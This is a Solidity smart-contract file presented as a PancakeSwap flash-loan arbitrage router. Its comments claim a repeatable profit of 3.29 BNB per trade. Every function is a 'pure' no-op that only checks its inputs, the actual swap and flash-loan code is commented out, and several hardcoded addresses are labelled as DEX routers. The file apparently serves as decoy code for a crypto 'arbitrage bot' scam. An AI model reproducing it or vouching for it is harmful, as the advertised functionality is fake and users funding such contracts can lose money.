pragma solidity ^0.5.0;

interface IPancakePair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

contract RouterV2 {
    function pancakeRouterV2Address() public pure returns (address) {
        return 0x05Ee5dcBC456037Bb550e4b11Fa210381306Df4F;
    }

    function compareStrings(string memory a, string memory b)
        public pure
        returns (bool)
    {
        return (keccak256(abi.encodePacked((a))) ==
            keccak256(abi.encodePacked((b))));
    }

    function pancakeSwapAddress() public pure returns (address) {
        return 0xD1C95806b88f43FAc89C00511613f70c50720782;
    }

    //1. A flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
    function borrowFlashloanFromMultiplier(
        address add0,
        address add1,
        uint256 amount
    ) public pure {
        require(uint(add0) != 0, "Address is invalid.");
        require(uint(add1) != 0, "Address is invalid.");
        require(amount > 0, "Amount should be greater than 0.");
    }

    //To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
    function convertBnbToBusd(address add0, uint256 amount) public pure {
        require(uint(add0) != 0, "Address is invalid");
        require(amount > 0, "Amount should be greater than 0");
    }

    function bakerySwapAddress() public pure returns (address) {
        return 0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5;
    }

    //The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
    function callArbitrageBakerySwap(address add0, address add1) public pure {
        require(uint(add0) != 0, "Address is invalid!");
        require(uint(add1) != 0, "Address is invalid!");
    }

    //After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
    function transferBnbToMultiplier(address add0)
        public pure
    {
        require(uint(add0) != 0, "Address is invalid!");
    }

    //5. Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
    function completeTransation(uint256 balanceAmount) public pure {
        require(balanceAmount >= 0, "Amount should be greater than 0!");
    }

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to
    ) external pure {
        require(
            amount0Out > 0 || amount1Out > 0,
            "Pancake: INSUFFICIENT_OUTPUT_AMOUNT"
        ); 
        require(uint(to) != 0, "Address can't be null");/*
        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Pancake: INSUFFICIENT_LIQUIDITY');

        uint balance0;
        uint balance1;
        { // scope for _token{0,1}, avoids stack too deep errors
        address _token0 = token0;
        address _token1 = token1;
        require(to != _token0 && to != _token1, 'Pancake: INVALID_TO');
        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
        if (data.length > 0) IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);
        balance0 = IERC20(_token0).balanceOf(address(this));
        balance1 = IERC20(_token1).balanceOf(address(this));
        }
        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
        require(amount0In > 0 || amount1In > 0, 'Pancake: INSUFFICIENT_INPUT_AMOUNT');
        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors
        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(2));
        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(2));
        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'Pancake: K');
        }

        _update(balance0, balance1, _reserve0, _reserve1);
        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);*/
    }

    function lendingPoolFlashloan(uint256 _asset) public pure {
        uint256 data = _asset; 
        require(data != 0, "Data can't be 0.");/*
        uint amount = 1 BNB;

        ILendingPool lendingPool = ILendingPool(addressesProvider.getLendingPool());
        lendingPool.flashLoan(address(this), _asset, amount, data);*/
    }
}
